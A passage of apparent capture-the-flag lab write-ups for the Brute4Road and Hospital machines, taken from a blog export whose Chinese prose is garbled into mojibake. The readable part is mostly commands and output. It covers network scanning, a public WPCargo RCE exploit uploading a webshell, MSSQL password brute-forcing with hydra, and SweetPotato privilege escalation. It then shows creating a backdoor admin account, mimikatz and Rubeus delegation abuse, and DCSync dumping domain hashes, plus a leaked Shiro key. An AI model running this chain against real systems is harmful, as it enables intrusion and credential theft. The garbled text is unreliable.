39.99.231.184:22\n[2025-04-15 02:37:33] [SUCCESS] æœåŠ¡è¯†åˆ« 39.99.231.184:21 => [ftp] ç‰ˆæœ¬:3.0.2 äº§å“:vsftpd ç³»ç»Ÿ:Unix Banner:[220 (vsFTPd 3.0.2).]\n[2025-04-15 02:37:34] [SUCCESS] æœåŠ¡è¯†åˆ« 39.99.231.184:22 => [ssh] ç‰ˆæœ¬:7.4 äº§å“:OpenSSH ä¿¡æ¯:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.]\n[2025-04-15 02:37:38] [SUCCESS] æœåŠ¡è¯†åˆ« 39.99.231.184:6379 => [redis] ç‰ˆæœ¬:5.0.12 äº§å“:Redis key-value store\n[2025-04-15 02:37:39] [SUCCESS] æœåŠ¡è¯†åˆ« 39.99.231.184:80 => [http] ç‰ˆæœ¬:1.20.1 äº§å“:nginx\n[2025-04-15 02:37:43] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 4\n[2025-04-15 02:37:43] [INFO] å¼€å§‹æ¼æ´æ‰«æ\n[2025-04-15 02:37:43] [INFO] åŠ è½½çš„æ’ä»¶: ftp, redis, ssh, webpoc, webtitle\n[2025-04-15 02:37:43] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://39.99.231.184      çŠ¶æ€ç :200 é•¿åº¦:4833   æ ‡é¢˜:Welcome to CentOS\n[2025-04-15 02:37:44] [SUCCESS] åŒ¿åç™»å½•æˆåŠŸ!\n[2025-04-15 02:37:46] [SUCCESS] Redis 39.99.231.184:6379 å‘ç°æœªæˆæƒè®¿é—® æ–‡ä»¶ä½ç½®:/usr/local/redis/db/dump.rdb\n[2025-04-15 02:37:50] [SUCCESS] Redisæ— å¯†ç è¿æ¥æˆåŠŸ: 39.99.231.184:6379\n[2025-04-15 02:37:53] [SUCCESS] æ‰«æå·²å®Œæˆ: 5/5\n~~~\n\næ‰“redisä¸»ä»å¤åˆ¶rceï¼Œflagåœ¨/home/redis/flagä¸‹ï¼Œä½†æ˜¯æ²¡æœ‰æƒé™è¯»ï¼Œbase64å…·æœ‰suidæƒé™ï¼Œå¯ä»¥ç”¨base64è¯»å–\n\n~~~\n/usr/bin/base64 ./flag01|/usr/bin/base64 -d\n~~~\n\nftpæœåŠ¡åªæœ‰ä¸€ä¸ªpubæ–‡ä»¶å¤¹ï¼Œæ²¡ä»€ä¹ˆç”¨ï¼Œä¸Šä¼ fscanæ‰«æä¸€ä¸‹å†…ç½‘\n\n~~~\n./fscan -h 172.22.2.7/24\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚    ___                              _        â”‚\nâ”‚   / _ \\     ___  ___ _ __ __ _  ___| | __    â”‚\nâ”‚  / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /    â”‚\nâ”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   <     â”‚\nâ”‚ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n      Fscan Version: 2.0.0\n\n[2025-04-15 15:22:58] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1\n[2025-04-15 15:22:58] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ\n[2025-04-15 15:22:58] [INFO] CIDRèŒƒå›´: 172.22.2.0-172.22.2.255\n[2025-04-15 15:22:58] [INFO] ç”ŸæˆIPèŒƒå›´: 172.22.2.0.%!d(string=172.22.2.255) - %!s(MISSING).%!d(MISSING)\n[2025-04-15 15:22:58] [INFO] è§£æCIDR 172.22.2.7/24 -> IPèŒƒå›´ 172.22.2.0-172.22.2.255\n[2025-04-15 15:22:58] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256\n[2025-04-15 15:22:58] [INFO] å¼€å§‹ä¸»æœºæ‰«æ\n[2025-04-15 15:22:58] [INFO] æ­£åœ¨å°è¯•æ— ç›‘å¬ICMPæ¢æµ‹...\n[2025-04-15 15:22:58] [INFO] å½“å‰ç”¨æˆ·æƒé™ä¸è¶³,æ— æ³•å‘é€ICMPåŒ…\n[2025-04-15 15:22:58] [INFO] åˆ‡æ¢ä¸ºPINGæ–¹å¼æ¢æµ‹...\n[2025-04-15 15:22:58] [SUCCESS] ç›®æ ‡ 172.22.2.3      å­˜æ´» (ICMP)\n[2025-04-15 15:22:58] [SUCCESS] ç›®æ ‡ 172.22.2.7      å­˜æ´» (ICMP)\n[2025-04-15 15:22:58] [SUCCESS] ç›®æ ‡ 172.22.2.16     å­˜æ´» (ICMP)\n[2025-04-15 15:22:58] [SUCCESS] ç›®æ ‡ 172.22.2.18     å­˜æ´» (ICMP)\n[2025-04-15 15:22:59] [SUCCESS] ç›®æ ‡ 172.22.2.34     å­˜æ´» (ICMP)\n[2025-04-15 15:23:04] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 5\n[2025-04-15 15:23:04] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233\n[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.3:88\n[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.18:80\n[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.16:80\n[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.7:80\n[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.18:22\n[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.7:22\n[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.7:21\n[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.18:139\n[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.16:139\n[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.34:135\n[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.16:135\n[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.3:139\n[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.3:135\n[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.34:445\n[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.18:445\n[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.16:445\n[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.3:445\n[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.3:389\n[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.34:139\n[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.16:1433\n[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.7:6379\n[2025-04-15 15:23:05] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.18:22 => [ssh] ç‰ˆæœ¬:8.2p1 Ubuntu 4ubuntu0.5 äº§å“:OpenSSH ç³»ç»Ÿ:Linux ä¿¡æ¯:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]\n[2025-04-15 15:23:05] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.7:22 => [ssh] ç‰ˆæœ¬:7.4 äº§å“:OpenSSH ä¿¡æ¯:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.]\n[2025-04-15 15:23:05] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.7:21 => [ftp] ç‰ˆæœ¬:3.0.2 äº§å“:vsftpd ç³»ç»Ÿ:Unix Banner:[220 (vsFTPd 3.0.2).]\n[2025-04-15 15:23:09] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.3:88 => \n[2025-04-15 15:23:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.16:80 => [http] ç‰ˆæœ¬:2.0 äº§å“:Microsoft HTTPAPI httpd ç³»ç»Ÿ:Windows\n[2025-04-15 15:23:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.7:80 => [http] ç‰ˆæœ¬:1.20.1 äº§å“:nginx\n[2025-04-15 15:23:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.16:139 =>  Banner:[.]\n[2025-04-15 15:23:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.3:139 =>  Banner:[.]\n[2025-04-15 15:23:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.18:80 => [http]\n[2025-04-15 15:23:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.34:445 => \n[2025-04-15 15:23:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.16:445 => \n[2025-04-15 15:23:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.3:445 => \n[2025-04-15 15:23:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.3:389 => [ldap] äº§å“:Microsoft Windows Active Directory LDAP ç³»ç»Ÿ:Windows ä¿¡æ¯:Domain: xiaorang.lab, Site: Default-First-Site-Name\n[2025-04-15 15:23:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.34:139 =>  Banner:[.]\n[2025-04-15 15:23:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.16:1433 => [ms-sql-s] ç‰ˆæœ¬:13.00.4001; SP1 äº§å“:Microsoft SQL Server 2016 ç³»ç»Ÿ:Windows Banner:[.%.]\n[2025-04-15 15:24:05] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.18:139 => \n[2025-04-15 15:24:05] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.18:445 => \n[2025-04-15 15:24:05] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.7:6379 => \n[2025-04-15 15:24:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.34:135 => \n[2025-04-15 15:24:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.16:135 => \n[2025-04-15 15:24:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.3:135 => \n[2025-04-15 15:24:10] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 21\n[2025-04-15 15:24:10] [INFO] å¼€å§‹æ¼æ´æ‰«æ\n[2025-04-15 15:24:10] [INFO] åŠ è½½çš„æ’ä»¶: findnet, ftp, ldap, ms17010, mssql, netbios, redis, smb, smb2, smbghost, ssh, webpoc, webtitle\n[2025-04-15 15:24:10] [SUCCESS] NetInfo æ‰«æç»“æœ\nç›®æ ‡ä¸»æœº: 172.22.2.34\nä¸»æœºå: CLIENT01\nå‘ç°çš„ç½‘ç»œæ¥å£:\n   IPv4åœ°å€:\n      â””â”€ 172.22.2.34\n[2025-04-15 15:24:10] [SUCCESS] NetInfo æ‰«æç»“æœ\nç›®æ ‡ä¸»æœº: 172.22.2.3\nä¸»æœºå: DC\nå‘ç°çš„ç½‘ç»œæ¥å£:\n   IPv4åœ°å€:\n      â””â”€ 172.22.2.3\n[2025-04-15 15:24:10] [SUCCESS] NetInfo æ‰«æç»“æœ\nç›®æ ‡ä¸»æœº: 172.22.2.16\nä¸»æœºå: MSSQLSERVER\nå‘ç°çš„ç½‘ç»œæ¥å£:\n   IPv4åœ°å€:\n      â””â”€ 172.22.2.16\n[2025-04-15 15:24:10] [INFO] ç³»ç»Ÿä¿¡æ¯ 172.22.2.3 [Windows Server 2016 Datacenter 14393]\n[2025-04-15 15:24:10] [SUCCESS] NetBios 172.22.2.34     XIAORANG\\CLIENT01             \n[2025-04-15 15:24:10] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.2.16        çŠ¶æ€ç :404 é•¿åº¦:315    æ ‡é¢˜:Not Found\n[2025-04-15 15:24:10] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.2.7         çŠ¶æ€ç :200 é•¿åº¦:4833   æ ‡é¢˜:Welcome to CentOS\n[2025-04-15 15:24:10] [SUCCESS] NetBios 172.22.2.3      DC:DC.xiaorang.lab               Windows Server 2016 Datacenter 14393\n[2025-04-15 15:24:10] [SUCCESS] NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393\n[2025-04-15 15:24:10] [INFO] ç³»ç»Ÿä¿¡æ¯ 172.22.2.16 [Windows Server 2016 Datacenter 14393]\n[2025-04-15 15:24:10] [SUCCESS] NetBios 172.22.2.18     WORKGROUP\\UBUNTU-WEB02        \n[2025-04-15 15:24:10] [SUCCESS] 172.22.2.34 CVE-2020-0796 SmbGhost Vulnerable\n[2025-04-15 15:24:10] [SUCCESS] åŒ¿åç™»å½•æˆåŠŸ!\n[2025-04-15 15:24:10] [SUCCESS] SMBè®¤è¯æˆåŠŸ 172.22.2.18:445 administrator:123456\n[2025-04-15 15:24:10] [INFO] SMB2å…±äº«ä¿¡æ¯ 172.22.2.18:445 administrator Pass:123456 å…±äº«:[print$ IPC$]\n[2025-04-15 15:24:10] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.2.18        çŠ¶æ€ç :200 é•¿åº¦:57738  æ ‡é¢˜:åˆä¸€ä¸ªWordPressç«™ç‚¹\n[2025-04-15 15:24:12] [INFO] SMB2å…±äº«ä¿¡æ¯ 172.22.2.16:445 admin Pass:123456 å…±äº«:[ADMIN$ C$ fileshare IPC$]\n[2025-04-15 15:24:18] [SUCCESS] SMBè®¤è¯æˆåŠŸ 172.22.2.16:445 admin:123456\n\n~~~\n\næ‰«åˆ°ä¸€å †å“¦ä¸€ä¸ªä¸€ä¸ªçœ‹ï¼Œ172.22.2.18çš„80ç«¯å£æ˜¯ä¸€ä¸ªwpsï¼Œç”¨wpscanæ‰«ä¸€ä¸‹\n\n~~~\n[i] Plugin(s) Identified:\n\n[+] wpcargo\n | Location: http://172.22.2.18/wp-content/plugins/wpcargo/\n | Last Updated: 2024-08-08T17:00:00.000Z\n | [!] The version is out of date, the latest version is 7.0.6\n |\n | Found By: Urls In Homepage (Passive Detection)\n |\n | [!] 6 vulnerabilities identified:\n |\n | [!] toc: true\ntitle: WPCargo < 6.9.0 - Unauthenticated RCE\n |     Fixed in: 6.9.0\n |     References:\n |      - https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25003\n |\n | [!] toc: true\ntitle: WPCargo Track & Trace < 6.9.5 - Reflected Cross Site Scripting\n |     Fixed in: 6.9.5\n |     References:\n |      - https://wpscan.com/vulnerability/d5c6f894-6ad1-46f4-bd77-17ad9234cfc3\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1436\n |\n | [!] toc: true\ntitle: WPCargo Track & Trace < 6.9.5 - Admin+ Stored Cross Site Scripting\n |     Fixed in: 6.9.5\n |     References:\n |      - https://wpscan.com/vulnerability/ef5aa8a7-23a7-4ce0-bb09-d9c986386114\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1435\n |\n | [!] toc: true\ntitle: WPCargo Track & Trace <= 7.0.6 - Unauthenticated SQL Injection\n |     References:\n |      - https://wpscan.com/vulnerability/f5fdb762-cbc1-4352-9ab2-cbba9d3d33e2\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-44004\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/0e725ec0-4897-4ba7-a803-80e8aafacbd1\n |\n | [!] toc: true\ntitle: WPCargo Track & Trace <= 7.0.6 - Missing authorization to Authenticated (Subscriber+) Settings Update\n |     References:\n |      - https://wpscan.com/vulnerability/b433fff9-b501-4fb3-9f04-5e18b64b0a90\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-54271\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/0c467a78-1ba4-4c0d-84e6-db54fc1b0c63\n |\n | [!] toc: true\ntitle: WPCargo Track & Trace <= 7.0.6 - Authenticated (Contributor+) Insecure Direct Object Reference\n |     References:\n |      - https://wpscan.com/vulnerability/594ae221-06b6-4bc2-b5b6-0f9bac880f7b\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-31609\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/887ecedb-0bc8-4488-b6fa-27cfa22345e6\n |\n | Version: 6.x.x (80% confidence)\n | Found By: Readme - Stable Tag (Aggressive Detection)\n |  - http://172.22.2.18/wp-content/plugins/wpcargo/readme.txt\n~~~\n\nå­˜åœ¨wpcargoæ’ä»¶ï¼Œæœ‰ä¸€ä¸ªrceçš„æ¼æ´https://github.com/biulove0x/CVE-2021-25003\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# python3 2 -t \"http://172.22.2.18/\"\n[proxychains] DLL init: proxychains-ng 4.17\n\n############################################\n# @author : biulove0x                      #\n# @name   : WP Plugins WPCargo Exploiter   #\n# @cve    : CVE-2021-25003                 #\n############################################\n\n[proxychains] Strict chain  ...  192.168.11.1:9999  ...  172.22.2.18:80  ...  OK\n[-] http://172.22.2.18/wp-content/wp-conf.php => Uploaded!\n~~~\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road1.png)\n\nèšå‰‘è¿æ¥ï¼Œå¯ä»¥æ‹¿åˆ°æ•°æ®åº“çš„å¯†ç \n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road2.png)\n\nflag2åœ¨æ•°æ®åº“é‡Œ\n\n# FLAG3\n\nåœ¨å¦ä¸€å¼ è¡¨é‡Œæœ‰å¾ˆå¤šå¯†ç \n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road3.png)\n\næ˜¯172.22.2.16 msssqlæ•°æ®åº“çš„å¯†ç æœ¬ï¼Œç„¶ååŠ¨æ‰‹çˆ†ç ´ï¼Œmssqlçš„é»˜è®¤ç”¨æˆ·åæ˜¯`sa`ï¼Œå› ä¸ºå¯¼å‡ºæ¥çš„æœ‰ç©ºæ ¼ï¼Œæ‰€ä»¥æŠŠå‰é¢çš„ç©ºæ ¼å¤„ç†æ‰\n\n~~~\nâ””â”€# grep -P \"\\w+\" pass -o >2\n~~~\n\n~~~\nâ””â”€# hydra -l sa -P pass 172.22.2.16 mssql -f -I -vV\n[1433][mssql] host: 172.22.2.16   login: sa   password: ElGNkOiC\n~~~\n\nç„¶åç”¨MDUTè¿æ¥\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road4.png)\n\nä¸Šä¼ [sweetpotato.exe](https://github.com/uknowsec/SweetPotato?tab=readme-ov-file)ç„¶åææƒ\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road5.png)\n\nflag03åœ¨C:\\Users\\Administrator\\flag\\ä¸‹\n\n~~~\nC:/Users/MSSQLSERVER/Desktop/SweetPotato.exe -a \"type C:\\Users\\Administrator\\flag\\flag03.txt\"\n~~~\n\n# FLAG4\n\nnetstat -anoå‘ç°å¼€å¯äº†3389\n\n~~~\nTCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4\n\n  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       692\n\n  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4\n\n  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       2680\n\n  TCP    0.0.0.0:2383           0.0.0.0:0              LISTENING       2932\n\n  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       812\n\n~~~\n\næ·»åŠ ä¸€ä¸ªç”¨æˆ·\n\n~~~\nC:/Users/MSSQLSERVER/Desktop/SweetPotato.exe -a \"net user lv Asd123123 /add\"\nC:/Users/MSSQLSERVER/Desktop/SweetPotato.exe -a \"net localgroup administrators lv /add\"\n~~~\n\nç„¶åè¿œç¨‹æ¡Œé¢ç™»å½•\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road6.png)\n\nå¯ä»¥å‘ç°æœ‰åŸŸç¯å¢ƒï¼Œå…ˆä¸Šä¼ mimikatzæå–hashï¼Œä¸Šä¼ bloodhoundå¯ä»¥å‘ç°æœ‰çº¦æŸæ€§å§”æ´¾\n\nè·å–åˆ°åŸŸç”¨æˆ·çš„å“ˆå¸Œä¸ºcea3e66a2715c71423e7d3f0ff6cd352\n\né€šè¿‡Rubeusç”³è¯·æœºå™¨è´¦æˆ·MSSQLSERVERçš„TGTï¼Œæ‰§è¡Œåï¼Œå°†å¾—åˆ° Base64 åŠ å¯†åçš„ TGT ç¥¨æ®\n\n```\nRubeus.exe asktgt /user:MSSQLSERVER$ /rc4:cea3e66a2715c71423e7d3f0ff6cd352 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap\n```\n\nç„¶åä½¿ç”¨ S4U2Self æ‰©å±•ä»£è¡¨åŸŸç®¡ç†å‘˜ Administrator è¯·æ±‚é’ˆå¯¹åŸŸæ§ LDAP æœåŠ¡çš„ç¥¨æ®ï¼Œå¹¶å°†å¾—åˆ°çš„ç¥¨æ®ä¼ é€’åˆ°å†…å­˜ä¸­\n\n~~~\nRubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:[base64(ticket.kirbi)]\n~~~\n\nLDAPæœåŠ¡å…·æœ‰DCSyncæƒé™ï¼Œå¯ä»¥å¯¼å‡ºåŸŸå†…ç”¨æˆ·å“ˆå¸Œ\n\n```\nmimikatz.exe \"lsadump::dcsync /domain:xiaorang.lab /user:Administrator\" exit\n```\n\nå¾—åˆ°åŸŸç®¡çš„å“ˆå¸Œä¸º1a19251fbd935969832616366ae3fe62\n\nç„¶åå°±å¯ä»¥ç”¨WMIæœåŠ¡ç™»å½•åŸŸæ§ï¼Œflagåœ¨C:\\Users\\Administrator\\flagä¸‹\n","tags":["é¶æœº"],"categories":["æ˜¥ç§‹äº‘é•œ"]},{"title":"æ˜¥ç§‹äº‘é•œ-Hospital","url":"/2025/04/10/æ˜¥ç§‹äº‘é•œ-Hospital/","content":"\n# flag01\n\né¦–å…ˆæ‰«æä¸€ä¸‹ç«¯å£ï¼Œæœ‰ä¸€ä¸ª22ç«¯å£å’Œ8080ç«¯å£ï¼Œç„¶åç”¨fscanå¯¹è¿™ä¸¤ä¸ªç«¯å£è¿›è¡Œæ‰«æï¼Œå¯ä»¥æ‰«åˆ°ä¸€ä¸ªheapdumpæ³„éœ²\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# ../pentest/fscan/fscan -h 39.99.232.64 -p 8080\n\n   ___                              _\n  / _ \\     ___  ___ _ __ __ _  ___| | __\n / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   <\n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\\n                     fscan version: 1.8.4\nstart infoscan\n39.99.232.64:8080 open\n[*] alive ports len is: 1\nstart vulscan\n[*] WebTitle http://39.99.232.64:8080  code:302 len:0      toc: true\ntitle:None è·³è½¬url: http://39.99.232.64:8080/login;jsessionid=AABFA3A139D86181B9A09BD41BE26BAD\n[*] WebTitle http://39.99.232.64:8080/login;jsessionid=AABFA3A139D86181B9A09BD41BE26BAD code:200 len:2005   toc: true\ntitle:åŒ»ç–—ç®¡ç†åå°\n[+] PocScan http://39.99.232.64:8080 poc-yaml-spring-actuator-heapdump-file\nå·²å®Œæˆ 1/1\n[*] æ‰«æç»“æŸ,è€—æ—¶: 6.890674118s\n~~~\n\nè®¿é—®/actuator/heapdumpï¼Œå¥–heapdumpä¸‹è½½ä¸‹äº†ï¼Œç„¶åç”¨JDumpSpideråˆ†æ\n\n~~~\nE:\\CTF\\heapdump via â˜• v17.0.11\nâ¯ java -jar .\\JDumpSpider-1.1-SNAPSHOT-full.jar .\\heapdump\n===========================================\nSpringDataSourceProperties\n-------------\nnot found!\n\n===========================================\nWeblogicDataSourceConnectionPoolConfig\n-------------\nnot found!\n\n===========================================\nMongoClient\n-------------\nnot found!\n\n===========================================\nAliDruidDataSourceWrapper\n-------------\nnot found!\n\n===========================================\nHikariDataSource\n-------------\nnot found!\n\n===========================================\nRedisStandaloneConfiguration\n-------------\nnot found!\n\n===========================================\nJedisClient\n-------------\nnot found!\n\n===========================================\nCookieRememberMeManager(ShiroKey)\n-------------\nalgMode = CBC, key = GAYysgMQhG7/CzIJlVpR2g==, algName = AES\n\n===========================================\nOriginTrackedMapPropertySource\n-------------\nmanagement.endpoints.web.exposure.include = *\nserver.port = 8080\nspring.thymeleaf.prefix = classpath:/templates/\n\n===========================================\nMutablePropertySources\n-------------\nawt.toolkit = sun.awt.X11.XToolkit\nsun.boot.class.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classes\njava.protocol.handler.pkgs = org.springframework.boot.loader\nsun.management.compiler = HotSpot 64-Bit Tiered Compilers\nsun.cpu.isalist =\nsun.jnu.encoding = UTF-8\njava.runtime.version = 1.8.0_392-8u392-ga-1~20.04-b08\njava.class.path = /app/login-1.0-SNAPSHOT.jar\npath.separator = :\njava.vm.vendor = Private Build\nos.version = 5.4.0-164-generic\njava.endorsed.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsed\njava.runtime.name = OpenJDK Runtime Environment\nfile.encoding = UTF-8\ncatalina.useNaming = false\nspring.beaninfo.ignore = true\njava.vm.specification.version = 1.8\nos.name = Linux\njava.vm.name = OpenJDK 64-Bit Server VM\nlocal.server.port = null\nuser.country = US\njava.vendor.url.bug = http://bugreport.sun.com/bugreport/\nsun.java.command = /app/login-1.0-SNAPSHOT.jar\njava.io.tmpdir = /tmp\ncatalina.home = /tmp/tomcat.5978727065775558529.8080\njava.version = 1.8.0_392\nuser.home = /home/app\nuser.language = en\nPID = 750\njava.awt.printerjob = sun.print.PSPrinterJob\nfile.separator = /\ncatalina.base = /tmp/tomcat.5978727065775558529.8080\njava.vm.info = mixed mode\njava.specification.name = Java Platform API Specification\njava.vm.specification.vendor = Oracle Corporation\njava.awt.graphicsenv = sun.awt.X11GraphicsEnvironment\njava.awt.headless = true\nsun.io.unicode.encoding = UnicodeLittle\njava.ext.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/ext\n\n===========================================\nMapPropertySources\n-------------\nlocal.server.port = null\n\n===========================================\nConsulPropertySources\n-------------\nnot found!\n\n===========================================\nJavaProperties\n-------------\njava.util.logging.FileHandler.pattern = %h/java%u.log\nawt.toolkit = sun.awt.X11.XToolkit\nsun.cpu.isalist =\nsun.jnu.encoding = UTF-8\nsun.arch.data.model = 64\ncatalina.useNaming = false\nsecurity.overridePropertiesFile = true\nsun.boot.library.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/amd64\nsecurity.provider.7 = com.sun.security.sasl.Provider\nsun.java.command = /app/login-1.0-SNAPSHOT.jar\nsecurity.provider.9 = sun.security.smartcardio.SunPCSC\njava.specification.vendor = Oracle Corporation\nsecurity.provider.1 = sun.security.provider.Sun\nsecurity.provider.2 = sun.security.rsa.SunRsaSign\nsecurity.provider.3 = sun.security.ec.SunEC\nnetworkaddress.cache.negative.ttl = 10\nsecurity.provider.4 = com.sun.net.ssl.internal.ssl.Provider\nsecurity.provider.5 = com.sun.crypto.provider.SunJCE\nsecurity.provider.6 = sun.security.jgss.SunProvider\nfile.separator = /\norg.springframework.web.servlet.HandlerExceptionResolver = org.springframework.web.servlet.mvc.method.annotation.ExceptionHandlerExceptionResolver,org.springframework.web.servlet.mvc.annotation.ResponseStatusExceptionResolver,org.springframework.web.servlet.mvc.support.DefaultHandlerExceptionResolver\njava.specification.name = Java Platform API Specification\njava.vm.specification.vendor = Oracle Corporation\norg.springframework.web.servlet.HandlerMapping = org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping,org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping,org.springframework.web.servlet.function.support.RouterFunctionMapping\norg.springframework.web.servlet.HandlerAdapter = 